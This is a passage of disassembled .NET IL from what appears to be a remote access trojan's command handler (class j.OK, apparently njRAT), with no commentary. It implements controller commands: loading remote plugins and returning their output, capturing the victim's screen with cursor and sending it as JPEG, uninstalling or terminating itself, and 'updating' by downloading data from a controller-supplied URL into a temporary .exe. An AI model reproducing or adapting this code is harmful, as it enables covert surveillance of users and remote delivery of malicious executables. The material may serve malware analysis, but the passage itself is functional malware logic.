      IL_1c7b:  br         IL_20e9

      IL_1c80:  nop
      IL_1c81:  ldloc.s    V_131
      IL_1c83:  ldstr      "ret"
      IL_1c88:  ldc.i4.0
      IL_1c89:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1c8e:  ldc.i4.0
      IL_1c8f:  ceq
      IL_1c91:  stloc.s    V_138
      IL_1c93:  ldloc.s    V_138
      IL_1c95:  brfalse    IL_1e54

      IL_1c9a:  nop
      IL_1c9b:  ldloc.0
      IL_1c9c:  ldc.i4.1
      IL_1c9d:  ldelem.ref
      IL_1c9e:  ldc.i4.0
      IL_1c9f:  newarr     [mscorlib]System.Byte
      IL_1ca4:  call       object j.OK::GTV(string,
                                            object)
      IL_1ca9:  castclass  uint8[]
      IL_1cae:  stloc.s    V_76
      IL_1cb0:  ldloc.0
      IL_1cb1:  ldc.i4.2
      IL_1cb2:  ldelem.ref
      IL_1cb3:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_1cb8:  ldc.i4.s   10
      IL_1cba:  clt
      IL_1cbc:  ldloc.s    V_76
      IL_1cbe:  ldlen
      IL_1cbf:  conv.ovf.i4
      IL_1cc0:  ldc.i4.0
      IL_1cc1:  ceq
      IL_1cc3:  and
      IL_1cc4:  stloc.s    V_138
      IL_1cc6:  ldloc.s    V_138
      IL_1cc8:  brfalse.s  IL_1d15

      IL_1cca:  ldc.i4.5
      IL_1ccb:  newarr     [mscorlib]System.String
      IL_1cd0:  stloc.s    V_108
      IL_1cd2:  ldloc.s    V_108
      IL_1cd4:  ldc.i4.0
      IL_1cd5:  ldstr      "pl"
      IL_1cda:  stelem.ref
      IL_1cdb:  nop
      IL_1cdc:  ldloc.s    V_108
      IL_1cde:  ldc.i4.1
      IL_1cdf:  ldsfld     string j.OK::Y
      IL_1ce4:  stelem.ref
      IL_1ce5:  nop
      IL_1ce6:  ldloc.s    V_108
      IL_1ce8:  ldc.i4.2
      IL_1ce9:  ldloc.0
      IL_1cea:  ldc.i4.1
      IL_1ceb:  ldelem.ref
      IL_1cec:  stelem.ref
      IL_1ced:  nop
      IL_1cee:  ldloc.s    V_108
      IL_1cf0:  ldc.i4.3
      IL_1cf1:  ldsfld     string j.OK::Y
      IL_1cf6:  stelem.ref
      IL_1cf7:  nop
      IL_1cf8:  ldloc.s    V_108
      IL_1cfa:  ldc.i4.4
      IL_1cfb:  ldc.i4.1
      IL_1cfc:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
      IL_1d01:  stelem.ref
      IL_1d02:  nop
      IL_1d03:  ldloc.s    V_108
      IL_1d05:  call       string [mscorlib]System.String::Concat(string[])
      IL_1d0a:  call       bool j.OK::Send(string)
      IL_1d0f:  pop
      IL_1d10:  br         IL_1e48

      IL_1d15:  nop
      IL_1d16:  ldloc.0
      IL_1d17:  ldc.i4.2
      IL_1d18:  ldelem.ref
      IL_1d19:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_1d1e:  ldc.i4.s   10
      IL_1d20:  cgt
      IL_1d22:  stloc.s    V_138
      IL_1d24:  ldloc.s    V_138
      IL_1d26:  brfalse.s  IL_1d76

      IL_1d28:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_1d2d:  stloc.s    V_79
      IL_1d2f:  ldloc.0
      IL_1d30:  ldc.i4.0
      IL_1d31:  ldelem.ref
      IL_1d32:  ldsfld     string j.OK::Y
      IL_1d37:  ldloc.0
      IL_1d38:  ldc.i4.1
      IL_1d39:  ldelem.ref
      IL_1d3a:  ldsfld     string j.OK::Y
      IL_1d3f:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_1d44:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_1d49:  stloc.s    V_78
      IL_1d4b:  ldloc.s    V_79
      IL_1d4d:  ldarg.0
      IL_1d4e:  ldloc.s    V_78
      IL_1d50:  ldarg.0
      IL_1d51:  ldlen
      IL_1d52:  conv.ovf.i4
      IL_1d53:  ldloc.s    V_78
      IL_1d55:  sub.ovf
      IL_1d56:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_1d5b:  nop
      IL_1d5c:  ldloc.s    V_79
      IL_1d5e:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_1d63:  call       uint8[] j.OK::ZIP(uint8[])
      IL_1d68:  stloc.s    V_76
      IL_1d6a:  ldloc.0
      IL_1d6b:  ldc.i4.1
      IL_1d6c:  ldelem.ref
      IL_1d6d:  ldloc.s    V_76
      IL_1d6f:  ldc.i4.3
      IL_1d70:  call       bool j.OK::STV(string,
                                          object,
                                          valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_1d75:  pop
      IL_1d76:  nop
      IL_1d77:  ldc.i4.5
      IL_1d78:  newarr     [mscorlib]System.String
      IL_1d7d:  stloc.s    V_108
      IL_1d7f:  ldloc.s    V_108
      IL_1d81:  ldc.i4.0
      IL_1d82:  ldstr      "pl"
      IL_1d87:  stelem.ref
      IL_1d88:  nop
      IL_1d89:  ldloc.s    V_108
      IL_1d8b:  ldc.i4.1
      IL_1d8c:  ldsfld     string j.OK::Y
      IL_1d91:  stelem.ref
      IL_1d92:  nop
      IL_1d93:  ldloc.s    V_108
      IL_1d95:  ldc.i4.2
      IL_1d96:  ldloc.0
      IL_1d97:  ldc.i4.1
      IL_1d98:  ldelem.ref
      IL_1d99:  stelem.ref
      IL_1d9a:  nop
      IL_1d9b:  ldloc.s    V_108
      IL_1d9d:  ldc.i4.3
      IL_1d9e:  ldsfld     string j.OK::Y
      IL_1da3:  stelem.ref
      IL_1da4:  nop
      IL_1da5:  ldloc.s    V_108
      IL_1da7:  ldc.i4.4
      IL_1da8:  ldc.i4.0
      IL_1da9:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
      IL_1dae:  stelem.ref
      IL_1daf:  nop
      IL_1db0:  ldloc.s    V_108
      IL_1db2:  call       string [mscorlib]System.String::Concat(string[])
      IL_1db7:  call       bool j.OK::Send(string)
      IL_1dbc:  pop
      IL_1dbd:  ldloc.s    V_76
      IL_1dbf:  ldstr      "A"
      IL_1dc4:  call       object j.OK::Plugin(uint8[],
                                               string)
      IL_1dc9:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_1dce:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_1dd3:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_1dd8:  stloc.s    V_77
      IL_1dda:  ldc.i4.5
      IL_1ddb:  newarr     [mscorlib]System.String
      IL_1de0:  stloc.s    V_108
      IL_1de2:  ldloc.s    V_108
      IL_1de4:  ldc.i4.0
      IL_1de5:  ldstr      "ret"
      IL_1dea:  stelem.ref
      IL_1deb:  nop
      IL_1dec:  ldloc.s    V_108
      IL_1dee:  ldc.i4.1
      IL_1def:  ldsfld     string j.OK::Y
      IL_1df4:  stelem.ref
      IL_1df5:  nop
      IL_1df6:  ldloc.s    V_108
      IL_1df8:  ldc.i4.2
      IL_1df9:  ldloc.0
      IL_1dfa:  ldc.i4.1
      IL_1dfb:  ldelem.ref
      IL_1dfc:  stelem.ref
      IL_1dfd:  nop
      IL_1dfe:  ldloc.s    V_108
      IL_1e00:  ldc.i4.3
      IL_1e01:  ldsfld     string j.OK::Y
      IL_1e06:  stelem.ref
      IL_1e07:  nop
      IL_1e08:  ldloc.s    V_108
      IL_1e0a:  ldc.i4.4
      IL_1e0b:  ldloc.s    V_77
      IL_1e0d:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_1e12:  ldnull
      IL_1e13:  ldstr      "GT"
      IL_1e18:  ldc.i4.0
      IL_1e19:  newarr     [mscorlib]System.Object
      IL_1e1e:  ldnull
      IL_1e1f:  ldnull
      IL_1e20:  ldnull
      IL_1e21:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[],
                                                                                                                        bool[])
      IL_1e26:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_1e2b:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
      IL_1e30:  stloc.s    V_123
      IL_1e32:  ldloca.s   V_123
      IL_1e34:  call       string j.OK::ENB(string&)
      IL_1e39:  stelem.ref
      IL_1e3a:  nop
      IL_1e3b:  ldloc.s    V_108
      IL_1e3d:  call       string [mscorlib]System.String::Concat(string[])
      IL_1e42:  call       bool j.OK::Send(string)
      IL_1e47:  pop
      IL_1e48:  nop
      IL_1e49:  nop
      IL_1e4a:  leave      IL_25af

      IL_1e4f:  br         IL_20e9

      IL_1e54:  nop
      IL_1e55:  ldloc.s    V_131
      IL_1e57:  ldstr      "CAP"
      IL_1e5c:  ldc.i4.0
      IL_1e5d:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1e62:  ldc.i4.0
      IL_1e63:  ceq
      IL_1e65:  stloc.s    V_138
      IL_1e67:  ldloc.s    V_138
      IL_1e69:  brfalse    IL_203c

      IL_1e6e:  nop
      IL_1e6f:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_1e74:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_1e79:  stloc.s    V_82
      IL_1e7b:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_1e80:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_1e85:  stloc.s    V_135
      IL_1e87:  ldloca.s   V_135
      IL_1e89:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Width()
      IL_1e8e:  ldloca.s   V_82
      IL_1e90:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Height()
      IL_1e95:  ldc.i4     0x21005
      IL_1e9a:  newobj     instance void [System.Drawing]System.Drawing.Bitmap::.ctor(int32,
                                                                                      int32,
                                                                                      valuetype [System.Drawing]System.Drawing.Imaging.PixelFormat)
      IL_1e9f:  stloc.s    V_84
      IL_1ea1:  ldloc.s    V_84
      IL_1ea3:  call       class [System.Drawing]System.Drawing.Graphics [System.Drawing]System.Drawing.Graphics::FromImage(class [System.Drawing]System.Drawing.Image)
      IL_1ea8:  stloc.s    V_83
      IL_1eaa:  ldloca.s   V_81
      IL_1eac:  ldloc.s    V_84
      IL_1eae:  callvirt   instance int32 [System.Drawing]System.Drawing.Image::get_Width()
      IL_1eb3:  ldloc.s    V_84
      IL_1eb5:  callvirt   instance int32 [System.Drawing]System.Drawing.Image::get_Height()
      IL_1eba:  call       instance void [System.Drawing]System.Drawing.Size::.ctor(int32,
                                                                                    int32)
      IL_1ebf:  nop
      IL_1ec0:  ldloc.s    V_83
      IL_1ec2:  ldc.i4.0
      IL_1ec3:  ldc.i4.0
      IL_1ec4:  ldc.i4.0
      IL_1ec5:  ldc.i4.0
      IL_1ec6:  ldloc.s    V_81
      IL_1ec8:  ldc.i4     0xcc0020
      IL_1ecd:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::CopyFromScreen(int32,
                                                                                                 int32,
                                                                                                 int32,
                                                                                                 int32,
                                                                                                 valuetype [System.Drawing]System.Drawing.Size,
                                                                                                 valuetype [System.Drawing]System.Drawing.CopyPixelOperation)
      IL_1ed2:  nop
      IL_1ed3:  nop
      .try
      {
        IL_1ed4:  ldloca.s   V_81
        IL_1ed6:  ldc.i4.s   32
        IL_1ed8:  ldc.i4.s   32
        IL_1eda:  call       instance void [System.Drawing]System.Drawing.Size::.ctor(int32,
                                                                                      int32)
        IL_1edf:  nop
        IL_1ee0:  ldloca.s   V_82
        IL_1ee2:  call       valuetype [System.Drawing]System.Drawing.Point [System.Windows.Forms]System.Windows.Forms.Cursor::get_Position()
        IL_1ee7:  ldloc.s    V_81
        IL_1ee9:  call       instance void [System.Drawing]System.Drawing.Rectangle::.ctor(valuetype [System.Drawing]System.Drawing.Point,
                                                                                           valuetype [System.Drawing]System.Drawing.Size)
        IL_1eee:  nop
        IL_1eef:  call       class [System.Windows.Forms]System.Windows.Forms.Cursor [System.Windows.Forms]System.Windows.Forms.Cursors::get_Default()
        IL_1ef4:  ldloc.s    V_83
        IL_1ef6:  ldloc.s    V_82
        IL_1ef8:  callvirt   instance void [System.Windows.Forms]System.Windows.Forms.Cursor::Draw(class [System.Drawing]System.Drawing.Graphics,
                                                                                                   valuetype [System.Drawing]System.Drawing.Rectangle)
        IL_1efd:  nop
        IL_1efe:  leave.s    IL_1f22

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_1f00:  dup
        IL_1f01:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_1f06:  stloc.s    V_88
        IL_1f08:  nop
        IL_1f09:  ldloc.s    V_88
        IL_1f0b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_1f10:  nop
        IL_1f11:  ldloc.s    V_88
        IL_1f13:  stloc.s    V_89
        IL_1f15:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_1f1a:  nop
        IL_1f1b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_1f20:  leave.s    IL_1f22

      }  // end handler
      IL_1f22:  nop
      IL_1f23:  ldloc.s    V_83
      IL_1f25:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::Dispose()
      IL_1f2a:  nop
      IL_1f2b:  ldloc.0
      IL_1f2c:  ldc.i4.1
      IL_1f2d:  ldelem.ref
      IL_1f2e:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
      IL_1f33:  ldloc.0
      IL_1f34:  ldc.i4.2
      IL_1f35:  ldelem.ref
      IL_1f36:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
      IL_1f3b:  newobj     instance void [System.Drawing]System.Drawing.Bitmap::.ctor(int32,
                                                                                      int32)
      IL_1f40:  stloc.s    V_80
      IL_1f42:  ldloc.s    V_80
      IL_1f44:  call       class [System.Drawing]System.Drawing.Graphics [System.Drawing]System.Drawing.Graphics::FromImage(class [System.Drawing]System.Drawing.Image)
      IL_1f49:  stloc.s    V_83
      IL_1f4b:  ldloc.s    V_83
      IL_1f4d:  ldloc.s    V_84
      IL_1f4f:  ldc.i4.0
      IL_1f50:  ldc.i4.0
      IL_1f51:  ldloc.s    V_80
      IL_1f53:  callvirt   instance int32 [System.Drawing]System.Drawing.Image::get_Width()
      IL_1f58:  ldloc.s    V_80
      IL_1f5a:  callvirt   instance int32 [System.Drawing]System.Drawing.Image::get_Height()
      IL_1f5f:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::DrawImage(class [System.Drawing]System.Drawing.Image,
                                                                                            int32,
                                                                                            int32,
                                                                                            int32,
                                                                                            int32)
      IL_1f64:  nop
      IL_1f65:  ldloc.s    V_83
      IL_1f67:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::Dispose()
      IL_1f6c:  nop
      IL_1f6d:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_1f72:  stloc.s    V_86
      IL_1f74:  ldstr      "CAP"
      IL_1f79:  ldsfld     string j.OK::Y
      IL_1f7e:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_1f83:  stloc.s    V_123
      IL_1f85:  ldloca.s   V_123
      IL_1f87:  call       uint8[] j.OK::SB(string&)
      IL_1f8c:  starg.s    b
      IL_1f8e:  ldloc.s    V_86
      IL_1f90:  ldarg.0
      IL_1f91:  ldc.i4.0
      IL_1f92:  ldarg.0
      IL_1f93:  ldlen
      IL_1f94:  conv.ovf.i4
      IL_1f95:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_1f9a:  nop
      IL_1f9b:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_1fa0:  stloc.s    V_87
      IL_1fa2:  ldloc.s    V_80
      IL_1fa4:  ldloc.s    V_87
      IL_1fa6:  call       class [System.Drawing]System.Drawing.Imaging.ImageFormat [System.Drawing]System.Drawing.Imaging.ImageFormat::get_Jpeg()
      IL_1fab:  callvirt   instance void [System.Drawing]System.Drawing.Image::Save(class [mscorlib]System.IO.Stream,
                                                                                    class [System.Drawing]System.Drawing.Imaging.ImageFormat)
      IL_1fb0:  nop
      IL_1fb1:  ldloc.s    V_87
      IL_1fb3:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_1fb8:  call       string j.OK::md5(uint8[])
      IL_1fbd:  stloc.s    V_85
      IL_1fbf:  ldloc.s    V_7
      IL_1fc1:  ldsfld     string j.OK::lastcap
      IL_1fc6:  ldc.i4.0
      IL_1fc7:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1fcc:  ldc.i4.0
      IL_1fcd:  ceq
      IL_1fcf:  ldc.i4.0
      IL_1fd0:  ceq
      IL_1fd2:  stloc.s    V_138
      IL_1fd4:  ldloc.s    V_138
      IL_1fd6:  brfalse.s  IL_1ff9

      IL_1fd8:  ldloc.s    V_7
      IL_1fda:  stsfld     string j.OK::lastcap
      IL_1fdf:  ldloc.s    V_86
      IL_1fe1:  ldloc.s    V_87
      IL_1fe3:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_1fe8:  ldc.i4.0
      IL_1fe9:  ldloc.s    V_87
      IL_1feb:  callvirt   instance int64 [mscorlib]System.IO.MemoryStream::get_Length()
      IL_1ff0:  conv.ovf.i4
      IL_1ff1:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_1ff6:  nop
      IL_1ff7:  br.s       IL_2003

      IL_1ff9:  nop
      IL_1ffa:  ldloc.s    V_86
      IL_1ffc:  ldc.i4.0
      IL_1ffd:  callvirt   instance void [mscorlib]System.IO.MemoryStream::WriteByte(uint8)
      IL_2002:  nop
      IL_2003:  nop
      IL_2004:  ldloc.s    V_86
      IL_2006:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_200b:  call       bool j.OK::Sendb(uint8[])
      IL_2010:  pop
      IL_2011:  ldloc.s    V_86
      IL_2013:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
      IL_2018:  nop
      IL_2019:  ldloc.s    V_87
      IL_201b:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
      IL_2020:  nop
      IL_2021:  ldloc.s    V_84
      IL_2023:  callvirt   instance void [System.Drawing]System.Drawing.Image::Dispose()
      IL_2028:  nop
      IL_2029:  ldloc.s    V_80
      IL_202b:  callvirt   instance void [System.Drawing]System.Drawing.Image::Dispose()
      IL_2030:  nop
      IL_2031:  nop
      IL_2032:  leave      IL_25af

      IL_2037:  br         IL_20e9

      IL_203c:  nop
      IL_203d:  ldloc.s    V_131
      IL_203f:  ldstr      "un"
      IL_2044:  ldc.i4.0
      IL_2045:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_204a:  ldc.i4.0
      IL_204b:  ceq
      IL_204d:  stloc.s    V_138
      IL_204f:  ldloc.s    V_138
      IL_2051:  brfalse    IL_20e9

      IL_2056:  nop
      IL_2057:  nop
      IL_2058:  ldloc.0
      IL_2059:  ldc.i4.1
      IL_205a:  ldelem.ref
      IL_205b:  stloc.s    V_136
      IL_205d:  nop
      IL_205e:  ldloc.s    V_136
      IL_2060:  ldstr      "~"
      IL_2065:  ldc.i4.0
      IL_2066:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_206b:  ldc.i4.0
      IL_206c:  ceq
      IL_206e:  stloc.s    V_137
      IL_2070:  ldloc.s    V_137
      IL_2072:  brfalse.s  IL_2080

      IL_2074:  nop
      IL_2075:  call       void j.OK::UNS()
      IL_207a:  nop
      IL_207b:  nop
      IL_207c:  br.s       IL_20e2

      IL_207e:  br.s       IL_20e2

      IL_2080:  nop
      IL_2081:  ldloc.s    V_136
      IL_2083:  ldstr      "!"
      IL_2088:  ldc.i4.0
      IL_2089:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_208e:  ldc.i4.0
      IL_208f:  ceq
      IL_2091:  stloc.s    V_138
      IL_2093:  ldloc.s    V_138
      IL_2095:  brfalse.s  IL_20aa

      IL_2097:  nop
      IL_2098:  ldc.i4.0
      IL_2099:  call       void j.OK::pr(int32)
      IL_209e:  nop
      IL_209f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
      IL_20a4:  nop
      IL_20a5:  nop
      IL_20a6:  br.s       IL_20e2

      IL_20a8:  br.s       IL_20e2

      IL_20aa:  nop
      IL_20ab:  ldloc.s    V_136
      IL_20ad:  ldstr      "@"
      IL_20b2:  ldc.i4.0
      IL_20b3:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_20b8:  ldc.i4.0
      IL_20b9:  ceq
      IL_20bb:  stloc.s    V_138
      IL_20bd:  ldloc.s    V_138
      IL_20bf:  brfalse.s  IL_20e2

      IL_20c1:  nop
      IL_20c2:  ldc.i4.0
      IL_20c3:  call       void j.OK::pr(int32)
      IL_20c8:  nop
      IL_20c9:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_20ce:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_20d3:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string)
      IL_20d8:  pop
      IL_20d9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
      IL_20de:  nop
      IL_20df:  nop
      IL_20e0:  br.s       IL_20e2

      IL_20e2:  nop
      IL_20e3:  nop
      IL_20e4:  leave      IL_25af

      IL_20e9:  nop
      IL_20ea:  ldloc.s    V_9
      IL_20ec:  ldstr      "up"
      IL_20f1:  ldc.i4.0
      IL_20f2:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_20f7:  ldc.i4.0
      IL_20f8:  ceq
      IL_20fa:  ldc.i4.0
      IL_20fb:  ceq
      IL_20fd:  stloc.s    V_138
      IL_20ff:  ldloc.s    V_138
      IL_2101:  brfalse.s  IL_2108

      IL_2103:  br         IL_22e3

      IL_2108:  nop
      IL_2109:  ldnull
      IL_210a:  stloc.2
      IL_210b:  ldloc.0
      IL_210c:  ldc.i4.1
      IL_210d:  ldelem.ref
      IL_210e:  ldc.i4.0
      IL_210f:  callvirt   instance char [mscorlib]System.String::get_Chars(int32)
      IL_2114:  ldc.i4.s   31
      IL_2116:  ceq
      IL_2118:  stloc.s    V_138
      IL_211a:  ldloc.s    V_138
      IL_211c:  brfalse    IL_21b6

      IL_2121:  nop
      .try
      {
        IL_2122:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
        IL_2127:  stloc.s    V_91
        IL_2129:  ldloc.0
        IL_212a:  ldc.i4.0
        IL_212b:  ldelem.ref
        IL_212c:  ldsfld     string j.OK::Y
        IL_2131:  call       string [mscorlib]System.String::Concat(string,
                                                                    string)
        IL_2136:  callvirt   instance int32 [mscorlib]System.String::get_Length()
        IL_213b:  stloc.s    V_90
        IL_213d:  ldloc.s    V_91
        IL_213f:  ldarg.0
        IL_2140:  ldloc.s    V_90
        IL_2142:  ldarg.0
        IL_2143:  ldlen
        IL_2144:  conv.ovf.i4
        IL_2145:  ldloc.s    V_90
        IL_2147:  sub.ovf
        IL_2148:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                   int32,
                                                                                   int32)
        IL_214d:  nop
        IL_214e:  ldloc.s    V_91
        IL_2150:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
        IL_2155:  call       uint8[] j.OK::ZIP(uint8[])
        IL_215a:  stloc.2
        IL_215b:  nop
        IL_215c:  leave      IL_2220

        IL_2161:  leave.s    IL_21b5

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_2163:  dup
        IL_2164:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_2169:  stloc.s    V_92
        IL_216b:  nop
        IL_216c:  ldloc.s    V_92
        IL_216e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_2173:  nop
        IL_2174:  ldloc.s    V_92
        IL_2176:  stloc.s    V_93
        IL_2178:  ldstr      "MSG"
        IL_217d:  ldsfld     string j.OK::Y
        IL_2182:  ldstr      "Update ERROR"
        IL_2187:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_218c:  call       bool j.OK::Send(string)
        IL_2191:  pop
        IL_2192:  ldstr      "bla"
        IL_2197:  call       bool j.OK::Send(string)
        IL_219c:  pop
        IL_219d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_21a2:  nop
        IL_21a3:  nop
        IL_21a4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_21a9:  leave      IL_25af

        IL_21ae:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_21b3:  leave.s    IL_21b5

      }  // end handler
      IL_21b5:  nop
      IL_21b6:  nop
      IL_21b7:  newobj     instance void [System]System.Net.WebClient::.ctor()
      IL_21bc:  stloc.s    V_4
      IL_21be:  nop
      .try
      {
        IL_21bf:  ldloc.s    V_4
        IL_21c1:  ldloc.0
        IL_21c2:  ldc.i4.1
        IL_21c3:  ldelem.ref
        IL_21c4:  callvirt   instance uint8[] [System]System.Net.WebClient::DownloadData(string)
        IL_21c9:  stloc.2
        IL_21ca:  leave.s    IL_221e

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_21cc:  dup
        IL_21cd:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_21d2:  stloc.s    V_94
        IL_21d4:  nop
        IL_21d5:  ldloc.s    V_94
        IL_21d7:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_21dc:  nop
        IL_21dd:  ldloc.s    V_94
        IL_21df:  stloc.s    V_95
        IL_21e1:  ldstr      "MSG"
        IL_21e6:  ldsfld     string j.OK::Y
        IL_21eb:  ldstr      "Update ERROR"
        IL_21f0:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_21f5:  call       bool j.OK::Send(string)
        IL_21fa:  pop
        IL_21fb:  ldstr      "bla"
        IL_2200:  call       bool j.OK::Send(string)
        IL_2205:  pop
        IL_2206:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_220b:  nop
        IL_220c:  nop
        IL_220d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_2212:  leave      IL_25af

        IL_2217:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_221c:  leave.s    IL_221e

      }  // end handler
      IL_221e:  nop
      IL_221f:  nop
      IL_2220:  nop
      IL_2221:  ldstr      "bla"
      IL_2226:  call       bool j.OK::Send(string)
      IL_222b:  pop
      IL_222c:  call       string [mscorlib]System.IO.Path::GetTempFileName()
      IL_2231:  ldstr      ".exe"
      IL_2236:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_223b:  stloc.s    V_5
      IL_223d:  nop
      .try
      {
        IL_223e:  ldstr      "MSG"
        IL_2243:  ldsfld     string j.OK::Y
        IL_2248:  ldstr      "Updating To "
        IL_224d:  ldloc.s    V_5
        IL_224f:  newobj     instance void [mscorlib]System.IO.FileInfo::.ctor(string)
        IL_2254:  callvirt   instance string [mscorlib]System.IO.FileInfo::get_Name()
        IL_2259:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
